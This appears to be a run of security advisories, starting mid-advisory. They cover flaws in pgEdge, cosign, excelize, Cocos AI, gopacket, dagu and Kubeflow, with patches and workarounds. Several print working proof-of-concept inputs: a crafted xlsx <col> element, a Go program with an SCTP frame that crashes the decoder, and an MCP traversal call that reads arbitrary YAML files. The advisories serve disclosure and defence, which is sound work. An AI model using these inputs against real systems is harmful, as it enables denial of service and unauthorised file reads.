The disclosed material authenticates to a third-party provider account rather than to pgEdge software, which is why the severity carries Scope: Changed.

Evidence at v0.1.1: llm/proxy/handlers.go:296 (handleHealth returning err.Error() in ProviderHealth.Error), llm/proxy/proxy.go:247 (authorize() defaulting to permit), and llm/proxy/proxy.go:350 (writeError writing the error with no redaction).

Patches

Fixed in 0.2.0. Upgrade to 0.2.0 or later, which redacts credentials from provider error messages unconditionally. The fix adds llm/internal/redact, with a follow-up anchoring word boundaries, and is pinned by tests in that package.

Note the version. There is no 0.1.2 — it was never cut, and some earlier material named it in error. 0.2.0 is the first fixed release.

Upgrading does not undo a disclosure that already happened. Rotate any LLM provider credential configured on an affected version where the proxy was reachable without an Authorize hook, particularly if a provider was rejecting that key at the time.

Workarounds

Set an Authorize hook on the proxy, which closes the unauthenticated route to the health endpoint. Restricting network access to the listening port limits who can reach it. Neither removes the underlying disclosure for a caller who does reach the endpoint.

Description

cosign verify-blob-attestation may erroneously report a "Verified OK" result for attestations with malformed payloads or mismatched predicate types. For old-format bundles and detached signatures, this was due to a logic flaw in the error handling of the predicate type validation. For new-format bundles, the predicate type validation was bypassed completely.

Impact

When cosign verify-blob-attestation is used without --check-claims set to true, an attestation that has a valid signature but a malformed or unparsable payload would be incorrectly validated. Additionally, systems relying on --type <predicate type> to reject attestations with mismatched types would be lead to trust the unexpected attestation type.

Patches

v3.0.6, v2.6.3

Workarounds

Always set --check-claims=true for attestation verification.

Additionally, systems relying on --type <predicate type> to reject attestations with mismatched types would be lead to trust the unexpected attestation type.

Summary

The max attribute of a <col> element in xl/worksheets/sheetN.xml is read verbatim on open with no check against MaxColumns, and flatCols() then walks Min..Max doing a deepcopy.Copy and append per iteration. Executed: max="300000", only about 18x past the real 16384 limit, cost 46.2 s of CPU and 122 MB on a single SetColWidth call, and the growth is linear in max up to 2^31-1.

Confirmed at ae2113b (HEAD at the time of audit).

Details

col.go:547, flatCols(), with the two loops at :549 and :564:

for i := col.Min; i <= col.Max; i++ {
...
for i := column.Min; i <= column.Max; i++ { ... fc = append(fc, deepcopy.Copy(...)) }

column.Min and column.Max are plain int attributes on xmlWorksheet.go:279-280, bound straight from the file. MaxColumns is 16384 (templates.go:176) and nothing in the parse path compares against it.

The contrast that makes this an oversight rather than a design decision is inside the callers themselves. SetColWidth validates its own column argument through parseColRange, which clamps to MaxColumns. But flatCols iterates ws.Cols.Col, the file-loaded slice, so the caller's validated argument never constrains the loop. The crafted column expands no matter which column the caller touches.

The row axis has the guard this axis is missing: GHSA-h69g-9hx6-f3v4 capped checkSheet's row allocation at TotalRows, and GHSA-q5j5-6p94-4gwc capped streaming Rows.Next. There is no column-axis equivalent.

Public entry points that flatten the existing columns: SetColWidth (col.go:498 into :534), SetColStyle (col.go:431 into :477), SetColVisible (col.go:282 into :313), SetColOutlineLevel (col.go:376 into :407).

PoC

Executed in-package: crafted a real xlsx, rezipped with an injected <cols> block before <sheetData>, opened it with OpenReader, then called SetColWidth.

<cols><col min="1" max="2147483647" width="9"/></cols>

f.SetColWidth("Sheet1", "A", "A", 12)

Measured:

  • max="300000": 46.2 s CPU, 122 MB allocated, ws.Cols.Col grew to 300000 entries, from one call.
  • max="5000000": did not complete in 110 s, killed by the test timeout.

Growth is linear in max. At max=2147483647 that is roughly two billion xlsxCol allocations, which is hundreds of gigabytes and in practice a permanent hang ending in OOM.

Impact

Any service that opens an untrusted spreadsheet and calls a column mutator. The input is a few dozen bytes of XML inside an otherwise ordinary workbook, no authentication is involved beyond whatever gates the upload, and the process is either wedged for minutes or killed by the OOM reaper. Availability only; no read or write primitive here.

Suggested fix

Validate col.Min and col.Max against MinColumns/MaxColumns when parsing the <col> element, or at the top of flatCols, returning ErrColumnNumber for out-of-range values. That mirrors what checkRowNum already does on the row axis.

Why this is not GHSA-h69g-9hx6-f3v4 or GHSA-q5j5-6p94-4gwc

Both of those are row-axis allocation bounds, and both fixes cap at TotalRows. Neither touched <col> parsing or flatCols. This is the same weakness class on the column axis, and it is arguably worse than the two that were fixed, because those had a cap that was bypassed while this one has no cap at all.

References

  • https://github.com/qax-os/excelize/security/advisories/GHSA-fq3v-74gv-27gm
  • https://github.com/qax-os/excelize/pull/2370

Summary

An attacker who can modify the attested workload’s code, memory-backed state, or configuration after the initial attestation — but without necessarily terminating the existing TLS connection — can cause the peer to continue trusting the connection as if the originally attested state were still running.

Details

Once attestation is successfully appraised and connection is established, there is a window of vulnerability from the establishment of connection to the termination of connection where an attacker can modify the state of the workload and platform at runtime on the TLS endpoint acting as the Attester. Workload state includes code, data, and configuration. Other examples of state changes at the workload level include cases where a new device (such as a GPU) is connected, or where a connected device is disconnected, since the connection establishment.

In Cocos AI, there is no mechanism for the peer to know that some state has changed in the Attester after the connection establishment. The vulnerability is particularly concerning for long-lived connections.

In short, this vulnerability was possible because Cocos AI performs attestation only once in the lifetime of the connection (at connection establishment time) and the verifying peer continues to believe that the state is the same as in initial Evidence throughout, whereas it could be stale at some point in time.

This vulnerability for Cocos AI was found and demonstrated by Muhammad Usama Sardar via formal analysis. Formal analysis was performed in the state-of-the-art tool, ProVerif.

Workarounds

The proposed workaround is to allow re-attestation of the workload after periodic or user-defined intervals using post-handshake attestation.

Background and General Technical Details

For background and general (not specific to Cocos AI) technical details on this vulnerability, please see G-RA2: Freshness of Evidence in Sec. 5.1.1 of Identity Crisis in Confidential Computing: Formal Analysis of Attested TLS. Also, see the corresponding formal analysis.

Credits

This vulnerability for Cocos AI was found and responsibly disclosed by Muhammad Usama Sardar (TU Dresden, Germany).

Summary

gopacket decodes SCTP (IP protocol 132) by walking the chunk chain through per-chunk-type decoder functions (decodeSCTPInit, decodeSCTPShutdown, decodeSCTPError, decodeSCTPSack, in layers/sctp.go). Each of these reads fixed-size header fields and runs count-driven loops without validating the chunk's declared length against the minimums those reads require. A single crafted SCTP segment causes a runtime panic (out-of-bounds slice read, or inverted slice from unsigned length arithmetic) on any decode path that does not install gopacket's per-packet panic recovery (gopacket.DecodeOptions.SkipDecodeRecovery: true); with the default API the same input degrades to a per-packet decode error.

The defect is present in every released version through v1.7.1 and at current master (18c5805). It is the SCTP component named - but not remediated - in CVE-2026-65819 (GHSA-8mcr-459q-5mx2, "Multiple layer decoders panic …", patched per advisory metadata in v1.7.1). The v1.7.1 hardening commit b772f56 ("layers:various: add protocol decoder length checks (#163)") added generic bounds to the chunk dispatcher and decodeSCTPChunk, but left every chunk sub-decoder without a per-type minimum-length check. The advisory's own description lists "SCTP chunk/parameter decoders (sctp.go)" among items "being confirmed; they should be remediated together with the above" - this report demonstrates that, at v1.7.1 and HEAD, that remediation still does not exist.

Patches

Fixed in v1.7.2 by commit 5080443 ("layers/sctp: bound chunk sub-decoders and parameters"). INIT/INIT-ACK, SACK and SHUTDOWN now check their chunk type's minimum length, SACK rejects gap-ack and duplicate-TSN counts the chunk can't hold, and decodeSCTPParameter rejects TLV lengths below 4 or beyond the buffer. Each case returns a decode error instead of panicking. The same commit fixes a panic on valid input, where a final parameter's padding lies outside the chunk length (RFC 9260 3.2). Regression tests: TestDecodeSCTPChunkRegression and TestDecodeSCTPParameterPadding in layers/decode_oob_test.go.

Upgrade with go get github.com/gopacket/gopacket@v1.7.2.

Workarounds

Before v1.7.2, keep panic recovery on: use gopacket.NewPacket without SkipDecodeRecovery, and DecodingLayerParser with IgnorePanic: false. The crafted packet then fails to decode instead of crashing the process.

Vulnerability Details

All line numbers refer to layers/sctp.go at commit 18c5805028329a6a8944f054d8d3f64ebc0f1373 (master, 2026-09-01; v1.7.1-1-g18c5805).

The shared entry point already present in v1.7.1 validates only that a chunk is present and that its declared length is ≥ 4 and covered by real bytes:

// sctp.go:129
func decodeSCTPChunk(data []byte) (SCTPChunk, error) {
    if len(data) < 4 { ... }
    length := binary.BigEndian.Uint16(data[2:4])
    if length < 4 { ... }
    actual := roundUpToNearest4(int(length))
    ct := SCTPChunkType(data[0])
    if ct == SCTPChunkTypeData && length < 16 { ... }   // only DATA gets a 16-byte minimum
    if len(data) < actual { ... }
    ...

The Data-chunk minimum of 16 bytes is never applied to the other chunk types, and none of the sub-decoders re-check before indexing. Four independent panic paths result (each reproduced at HEAD):

Defect 1 - INIT / INIT-ACK chunks (decodeSCTPInit, sctp.go:423): reads data[4:8], data[8:12] (line 431), data[12:14], data[14:16], data[16:20] (line 434), then slices paramData := data[20:sc.ActualLength] (line 436).

  • Declared length 8–11, actual 8–12 -> data[8:12] reads past the chunk: panic: runtime error: slice bounds out of range [:12] with capacity 8
  • Declared length 15, actual 16 -> data[16:20] past the chunk: panic: runtime error: slice bounds out of range [:20] with capacity 16
  • Declared length ≤ 19 -> the data[20:ActualLength] slice is inverted (panic) or the subsequent parameter loop runs on attacker data without the decodeSCTPParameter length check (Defect 3).

Defect 2 - SHUTDOWN chunks (decodeSCTPShutdown, sctp.go:670): reads binary.BigEndian.Uint32(data[4:8]) (line 677) on a chunk whose declared length is only validated as ≥ 4: panic: runtime error: slice bounds out of range [:8] with capacity 4 (4-byte chunk).

Defect 3 - ERROR (and HEARTBEAT/INIT) parameter decoder (decodeSCTPParameter, sctp.go:193): the crafted Length field is used to slice with no bound against the parameter buffer:

// sctp.go:193
func decodeSCTPParameter(data []byte) SCTPParameter {
    length := binary.BigEndian.Uint16(data[2:4])
    return SCTPParameter{
        ...
        Value:        data[4:length],   // line 198: no check length >= 4 or length <= len(data)
        ActualLength: roundUpToNearest4(int(length)),
    }
}
  • length < 4 -> inverted slice: panic: runtime error: slice bounds out of range [4:0] (reached from decodeSCTPError line 632 paramData := data[4:sc.Length], and from the INIT (438) / HEARTBEAT (578) parameter loops).
  • length > len(data) -> slice-bounds-check panic (Go's slice bounds check panics; the read never silently over-reads).

Defect 4 - SACK chunk count loops (decodeSCTPSack, sctp.go:484): NumGapACKs / NumDuplicateTSNs (attacker-controlled uint16 fields) drive loops that slice the remaining bytes with no bound:

// sctp.go:512
bytesRemaining := data[16:]
for i := 0; i < int(sc.NumGapACKs); i++ {                       // line 513
    sc.GapACKs = append(sc.GapACKs, binary.BigEndian.Uint16(bytesRemaining[:2]))  // line 514
    bytesRemaining = bytesRemaining[2:]
}
for i := 0; i < int(sc.NumDuplicateTSNs); i++ {                 // line 517
    sc.DuplicateTSNs = append(sc.DuplicateTSNs, binary.BigEndian.Uint32(bytesRemaining[:4]))  // line 518
    bytesRemaining = bytesRemaining[4:]
}

A 16-byte SACK chunk declaring NumGapACKs = 1 with no following bytes: panic: runtime error: slice bounds out of range [:2] with capacity 0

Note this is not the sFlow/Diameter "unbounded allocation" family already covered by CVE-2026-54332/CVE-2026-54345; the SACK make() capacities are already capped against ActualLength (lines 505–510) - the loop iteration counts are not, so the panic is an out-of-bounds read, not an allocation.

History / version range. decodeSCTPInit and the chunk sub-decoders were introduced in commit 2fca351 (original full-featured SCTP implementation; at the time the file was named layer_sctp.go - the current sctp.go path dates from the rename in dea6b39). The sinks are present in every release from v1.0.0 through v1.7.1 and at HEAD (also confirmed at v1.6.0). b772f56 (2026-07-08, included in v1.7.1) touched layers/sctp.go but only hardened the dispatcher (decodeWithSCTPChunkTypePrefix) and the generic decodeSCTPChunk/decodeSCTPDataChunk bounds; the four sub-decoder paths above are unchanged by it. The v1.7.1 regression-test commit 2220269 covers the advisory's other decoders, not SCTP chunk sub-decoders. Affected range is therefore every gopacket version: <= 1.7.1, plus current master 18c5805. (Maintainer update: fixed in v1.7.2, commit 5080443; see Patches.)

Relationship to the published advisory (dedup context). CVE-2026-65819 / GHSA-8mcr-459q-5mx2 (published 2026-07-27) declares vulnerable_version_range: <= 1.7.0 / patched_versions: 1.7.1. Its description explicitly names "SCTP chunk/parameter decoders (sctp.go)" among decoder families "(on the recovering path only) … being confirmed; they should be remediated together with the above". Because the advisory metadata tells consumers that upgrading to 1.7.1 remediates the advisory, and this SCTP component was not actually fixed, the practical status of this finding is incomplete remediation of a published advisory: consumers of the 1.7.1 "patched" version remain exposed to the SCTP panic path. The finding is reported here so the maintainers can either complete the SCTP fix under the existing advisory or track it separately.

Impact

An unauthenticated remote attacker can crash a gopacket-based decoder with a single crafted SCTP segment (IP protocol 132). A 54-byte Ethernet frame (Ethernet -> IPv4 -> SCTP with an 8-byte INIT chunk) is enough (see Reproduction Steps). Panic escapes for consumers that disable gopacket's built-in recovery:

  • gopacket.NewPacket(data, layerType, DecodeOptions{SkipDecodeRecovery: true}) - panic propagates to the caller, terminating the process if uncaught.
  • Direct use of the registered SCTP decode chain without recovery.

Two gopacket entry points install recovery by default and are therefore NOT crash surfaces for this bug: gopacket.NewPacket with default options (deferred recover wraps the whole decode chain, converting the panic into a per-packet error, demonstrated in case B below), and DecodingLayerParser.DecodeLayers when IgnorePanic is false (parser.go:306 - if !l.IgnorePanic { defer panicToError(&err) }); in both cases the packet simply fails to decode. Panic escape - and process crash - requires the non-recovering settings above. This mirrors exactly the reachability of the sibling advisories in the same family (GHSA-6h9g MPTCP, GHSA-8mcr): CVE-2026-65819 itself is scored with the same AV:N/AC:L/PR:N/UI:N vector while noting (per the GHSA advisory text) ~5.3 (Medium) for recovering-path-only consumers; the reporter scored the non-recovering consumer set at 7.5, which is the configuration used by high-throughput packet-analysis engines that set SkipDecodeRecovery to detect decode failures themselves.

The default API (gopacket.NewPacket(..., gopacket.Default)) installs defer recover and converts the panic into a per-packet decode error, so crash exposure is limited to non-recovering consumers (packet-analysis engines, IDS/NDR pipelines, capture-processing tools that set SkipDecodeRecovery or call decoders directly - the same consumer set described in the CVE-2026-65819 and CVE-2026-54332/54345 advisories).

Impact is availability only: no memory disclosure, no code execution, no allocation amplification. Severity: CVSS 3.1 5.9 Medium - CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (reporter proposed 7.5 with AC:L; maintainers set AC:H because a crash needs the consumer to disable panic recovery), primary CWE-125 (out-of-bounds read), secondaries CWE-129 (improper validation of array index for the inverted slices).

Per-metric justification (primary vector):

  • Attack Vector (AV): Network - a single crafted SCTP segment (IP protocol 132) delivered over the wire triggers the panic path; no local access needed.
  • Attack Complexity (AC): High - the input is trivial (a 54-byte frame with an 8-byte INIT chunk), but a crash depends on a condition outside the attacker's control: the target must have disabled gopacket's panic recovery. Default configurations only produce a decode error.
  • Privileges Required (PR): None - the decoding library processes untrusted captured/live packets with no authentication.
  • User Interaction (UI): None - no victim action; the crash occurs during automated decode.
  • Scope (S): Unchanged - the impacted security authority is the decoder's own process (the caller's application).
  • Confidentiality (C): None - no data disclosure.
  • Integrity (I): None - no data modification.
  • Availability (A): High - non-recovering consumer process terminates (panic); the ~5.3 recovering-path-only alternative is disclosed above.

Reproduction Steps

Environment: Go 1.25 toolchain (module requires go 1.25.0), github.com/gopacket/gopacket at HEAD 18c5805028329a6a8944f054d8d3f64ebc0f1373 (v1.7.1 + 1 commit). The same output is produced at tag v1.7.1.

// repro_sctp.go - single static input, one deterministic observable (decode panic)
package main

import (
    "fmt"

    "github.com/gopacket/gopacket"
    "github.com/gopacket/gopacket/layers"
)

func main() {
    // One 54-byte frame: Ethernet -> IPv4(proto 132) -> SCTP -> INIT chunk (declared length 8)
    frame := []byte{
        // Ethernet
        0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x08, 0x00,
        // IPv4, protocol 132 (SCTP), total length 40
        0x45, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x00, 0x84,
        0x0a, 0x00, 0x00, 0x01, 0x0a, 0x00, 0x00, 0x02,
        // SCTP common header (12 bytes)
        0x11, 0x11, 0x22, 0x22, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        // INIT chunk: type=1, flags=0, length=8 (declared), body 4 bytes
        0x01, 0x00, 0x00, 0x08, 0xaa, 0xbb, 0xcc, 0xdd,
    }
    // same bytes as hex:
    // ffffffffffff00112233445508004500002800000000008400840a0000010a000002
    // 1111222200000000000000000100000008aabbccdd

    // A) Non-recovering decode (SkipDecodeRecovery: true) -> panic escapes
    func() {
        defer func() {
            if r := recover(); r != nil {
                fmt.Printf("A) SkipDecodeRecovery=true  -> PANIC: %v\n", r)
            }
        }()
        p := gopacket.NewPacket(frame, layers.LayerTypeEthernet,
            gopacket.DecodeOptions{Lazy: false, SkipDecodeRecovery: true})
        _ = p.Dump()
        fmt.Println("A) no panic (unexpected)")
    }()

    // B) Default (recovering) API -> per-packet error, process survives
    p := gopacket.NewPacket(frame, layers.LayerTypeEthernet, gopacket.Default)
    fmt.Printf("B) Default (recovering)    -> err=%v  layers=%d\n", p.ErrorLayer(), len(p.Layers()))
}

Build and run (module file go.mod):

module repro

go 1.25.0

require github.com/gopacket/gopacket v1.7.1

replace github.com/gopacket/gopacket => /path/to/clone/of/gopacket/gopacket  # at 18c5805 (or tag v1.7.1)

$ go build -o repro_sctp repro_sctp.go
$ ./repro_sctp
A) SkipDecodeRecovery=true  -> PANIC: runtime error: slice bounds out of range [:12] with capacity 8
B) Default (recovering)    -> err=Packet decoding error: runtime error: slice bounds out of range [:12] with capacity 8  layers=4

Observed stack (case A): layers.decodeSCTPInit at layers/sctp.go:431 <- SCTPChunkType.Decode <- decodeWithSCTPChunkTypePrefix (sctp.go:57) <- decodeSCTP (sctp.go:38) <- NewPacket.

Additional one-input repros for the other three defect classes (same harness shape, decode root LayerTypeSCTP with SkipDecodeRecovery: true):

Input Panic (observed) Sink
INIT-ACK chunk type 2, declared length 8 slice bounds out of range [:12] with capacity 8 sctp.go:431
INIT chunk declared length 15, 12-byte body slice bounds out of range [:20] with capacity 16 sctp.go:434
SACK chunk type 3, length 16, NumGapACKs=1, NumDuplicateTSNs=1, no trailing bytes slice bounds out of range [:2] with capacity 0 sctp.go:514
SHUTDOWN chunk type 7, declared length 4 slice bounds out of range [:8] with capacity 4 sctp.go:677
ERROR chunk type 9, length 8, 4-byte "parameter" with Length field 0 slice bounds out of range [4:0] sctp.go:198

Recommendations

Complete the v1.7.1 remediation by validating each chunk subtype's declared length against the fixed-size fields and loops that consume it, immediately after decodeSCTPChunk succeeds in each sub-decoder. Minimal correct changes in layers/sctp.go:

  1. decodeSCTPInit: require sc.ActualLength >= 20 before reading data[4:20] (return a decode error otherwise), then bound the parameter loop: paramData := data[20:sc.ActualLength] is safe once the chunk length is ≥ 20 and decodeSCTPParameter is hardened (below).
  2. decodeSCTPShutdown: require sc.ActualLength >= 8.
  3. decodeSCTPSack: require sc.ActualLength >= 16, and cap the loops - iterate min(NumGapACKs, remaining/2) and min(NumDuplicateTSNs, remaining/4), returning an error (or silently stopping with SetTruncated) when a count exceeds the bytes available.
  4. decodeSCTPParameter (shared by INIT/HEARTBEAT/ERROR): reject length < 4 and length > len(data) before the data[4:length] slice, mirroring the bound style already used for TCP options (tcp.go default branch) - this closes Defect 3 at its root regardless of which loop calls it.

Optionally add regression tests in the style of 2220269 covering short INIT/SHUTDOWN/SACK/ERROR chunks.

Resources

  • Source at pin: layers/sctp.go @ https://github.com/gopacket/gopacket/blob/18c5805028329a6a8944f054d8d3f64ebc0f1373/layers/sctp.go (lines 129–136 dispatcher/chunk guard, 193–202 decodeSCTPParameter, 423–442 decodeSCTPInit, 484–521 decodeSCTPSack, 670–678 decodeSCTPShutdown, 623–636 decodeSCTPError)
  • Fix commit that missed the sub-decoders: https://github.com/gopacket/gopacket/commit/b772f566a3ecc53c099bdd44eab4718088c4e866 (PR #163, "layers:various: add protocol decoder length checks")
  • Regression-test commit: https://github.com/gopacket/gopacket/commit/2220269 (v1.7.1, "test(layers): add regression tests for the decoder panic advisories")
  • Advisory that names the unfixed SCTP component: https://github.com/gopacket/gopacket/security/advisories/GHSA-8mcr-459q-5mx2 (CVE-2026-65819, "Multiple layer decoders panic on crafted packets …, including (on the recovering path only) … SCTP chunk/parameter decoders (sctp.go)"); NVD: https://nvd.nist.gov/vuln/detail/CVE-2026-65819
  • Sibling advisory with identical reachability framing (High 7.5): https://github.com/gopacket/gopacket/security/advisories/GHSA-6h9g-cjv3-pg2c (TCP MPTCP option decoder)
  • Introduced in: https://github.com/gopacket/gopacket/commit/2fca351 (original SCTP implementation)

Summary

The traversal fix for CVE-2026-33344 was implemented as HTTP middleware installed only in the chi handler chain, but the MCP service calls the same API method in process, so arbitrary YAML file read is reachable again through the MCP tool surface with a viewer-role key. Read-only, limited to .yaml/.yml targets. Confirmed at HEAD f6c039f (post v2.10.7).

The defect

The fix for CVE-2026-33344 is a reflection-based HTTP middleware (internal/frontend/.../api.go, roughly lines 553-597) that inspects a request field named FileName and rejects anything that is not a plain name. It is installed in exactly one place: the chi strict-handler chain (api.go around line 419).

The MCP service does not go through that chain. internal/service/mcp/server.go calls the API method directly as an in-process Go call:

func (svc *Service) getDAGSpec(ctx context.Context, name string) (map[string]any, error) {   // line 307
    resp, err := svc.api.GetDAGSpec(ctx, daguapi.GetDAGSpecRequestObject{
        FileName: daguapi.DAGFileName(name),                                                 // line 309
    })

No HTTP request is constructed, so no middleware executes, and the underlying resolver is still uncontained:

func (store *Storage) locateDAG(nameOrPath string) (string, error) {                 // line 1041
    if strings.Contains(nameOrPath, string(filepath.Separator)) {                    // line 1042
        foundPath, err := findDAGFile(nameOrPath)
        if err == nil {
            return foundPath, nil                                                    // line 1045, no containment check
        }
    }

An absolute path contains a separator, so it takes the first branch and is returned as-is, with no check that it falls under store.baseDir or any entry in store.searchPaths.

Verification

Verified end to end using the project's own conformance/mcptest harness against a real running HTTP server, not by source reading:

dagu_read {"target":"dag_spec","name":"/abs/outside/secret.yaml"}
-> HTTP 200, full file contents returned in data.spec

This also succeeded with a viewer-role API key on an auth-enabled server (auth.mode: builtin), so it is not admin-only. Control test that makes this a residual: the equivalent REST request is correctly blocked (400, "name must only contain alphanumeric characters..."). The HTTP lane is fixed; the MCP lane is not.

Bounded impact: read only (dagu_change and dagu_execute are both blocked by spec-level name validation; I tested both); only .yaml/.yml targets. Secondary: GetDAGSpec skips the requireWorkspaceVisible check its sibling handlers run, so this also crosses workspace isolation.

Suggested fix

Move the containment check out of HTTP middleware and into locateDAG itself, rejecting any resolved path that does not fall under baseDir or a configured search path. A middleware that runs on only one of two transports into the same API cannot hold the boundary; the resolver is the correct chokepoint since both transports converge there. Separately, add requireWorkspaceVisible to GetDAGSpec to match its siblings.

Tooling

AI assistance was used while investigating. The traversal was reproduced against a real running server through the project's own MCP conformance harness, including with a viewer-role API key, and the REST control test confirms the HTTP lane is blocked. Confirmed in the uncontained locateDAG branch and the direct in-process GetDAGSpec call at HEAD.

Summary

The Kubeflow Pipelines frontend reflected untrusted pod names and namespaces into HTML error responses from the pod-information and pod-events routes. An attacker could craft a link that causes JavaScript to execute in the frontend's origin when a user follows it and reaches an affected error response.

Affected routes include /pipeline/k8s/pod and /pipeline/k8s/pod/events (the deployment's configured base path may differ).

Impact and prerequisites

Successful exploitation requires a victim to open an attacker-supplied link and reach the vulnerable response. JavaScript execution may expose information accessible to the victim's browser or perform actions in the application's origin.

The attacker does not need an account merely to construct and deliver the link. The victim must satisfy the deployment's authentication and route-access requirements. Cookie theft depends on cookie attributes and deployment protections; it is not guaranteed. The submitted evidence does not establish an availability impact or server-side code execution.

Technical details

The pod handlers pass podname and podnamespace query values to getPod and listPodEvents in frontend/server/k8s-helper.ts. Before remediation, failure messages incorporated those values, along with backend error details, and were returned as HTML-capable string responses.

Kubernetes rejecting an invalid resource name did not prevent the issue: the rejected name could still be included in the frontend's error response.

PR #12295 changed the error construction to validate pod names and namespaces with isAllowedResourceName. Invalid values produce a constant error message instead of reflecting the supplied value, and backend error details are no longer included in these responses. The change includes invalid-resource-name tests.

Affected versions and remediation

Affected product: the Kubeflow Pipelines frontend server, identified as ghcr.io/kubeflow/kfp-frontend. Historical releases may use earlier image registry names.

Upgrade to KFP 2.15.0 or later.

The fix merged on October 10, 2025, in commit fedc25e3f7251933d4a37b964bc3e8176beea28e. It is first present in the 2.15.0 release, published November 25, 2025.

The affected range is recorded as < 2.15.0. The original introduction version and separate maintenance-branch backports have not been established. These are KFP component versions, not Kubeflow platform or Python SDK versions.

Distinction from existing artifact XSS

CVE-2023-6571, tracked in the repository as GHSA-j9xw-rrjg-2p9r, documents reflection of the artifact source parameter in an unknown-storage-source error.

This report concerns different handlers and error construction: pod information and pod events. The artifact-source fix in PR #9844, released in 2.0.2, did not repair these pod responses. They required the later change in #12295.

This independently fixable pod-route defect is tracked as CVE-2026-88986. It does not broaden CVE-2023-6571 or absorb artifact-content rendering and other XSS reports.

Attribution

@pwny0 submitted this report on September 23, 2023, and retains the reporter credit.

@JerT33 authored the remediation in PR #12295. Fix attribution is separate from vulnerability-report attribution.

Summary

Kubeflow Pipelines API server does not sufficiently validate SQL identifier fields decoded from the page_token pagination parameter. Client-controlled fields can reach SQL query construction, allowing SQL injection through list APIs.

This advisory consolidates the original pipeline-listing report and the later run-listing report in GHSA-mhpc-2x8q-2vp9. Their contributions and chronology are distinguished below.

Impact and prerequisites

An attacker able to invoke an affected list API may read data accessible to the API server's database account, including data belonging to other namespaces. The original report demonstrated database read access through an authenticated Kubeflow deployment.

Authentication and authorization requirements depend on deployment configuration. In multi-user deployments, the attacker must pass the applicable endpoint authorization checks. A single-user deployment that exposes the API without an authentication layer may be reachable without credentials.

The submitted evidence establishes a confidentiality issue. Database modification was not demonstrated; this advisory does not claim arbitrary database writes.

Technical details

Pagination tokens are base64-encoded JSON, not trusted server-side state. Before the fix, token deserialization accepted structural fields such as key and sort identifiers without sufficient validation before SQL construction.

The reports describe complementary paths through this defect:

  • Pipeline listing: the original report demonstrated injection through KeyFieldName.
  • Run listing: the later report documented SortByFieldName reaching query construction in both the v1beta1 and v2beta1 APIs, including metric joins, selected column aliases, ordering, and column propagation through resource-reference and task joins.

These paths share the unvalidated pagination-token boundary. Review of the later report and its discussion identified no reported path left unresolved by the merged fix.

Remediation

Upgrade the Kubeflow Pipelines API server to 2.17.0 or later.

PR #13127, included in 2.17.0, validates token identifiers and filter keys before query construction. It also separates user-facing metric names from SQL identifiers, uses a fixed metric-column alias, and parameterizes the metric-name join condition.

The PR additionally addresses first-page metric sorting without a pagination token. That additional protection is part of the remediation; the duplicate determination here concerns the page-token claims actually submitted in the two reports, not merely their inclusion in the same PR.

The original report identified its deployment as Kubeflow 1.7, which should not be interpreted as a verified Kubeflow Pipelines component-version boundary. The later report identified KFP 2.16.0. These are reported affected environments, not an established introduction version.

Attribution and report history

  • @phisch1991 and @k0rti: credited reporters of the original pipeline-listing SQL injection submitted on December 13, 2023.
  • BugBunny.ai (@bugbunny-research): submitted the later report on April 1, 2026, documenting the run-listing and metric-query paths in GHSA-mhpc-2x8q-2vp9. This acknowledges that specific contribution without implying authorship of the 2023 report.
  • Cyber Nagle: authored the merged remediation in PR #13127.

GHSA-mhpc-2x8q-2vp9 is consolidated here for vulnerability tracking. Its submission and reporter credit remain preserved on that advisory; closure as a duplicate does not characterize the report as invalid.
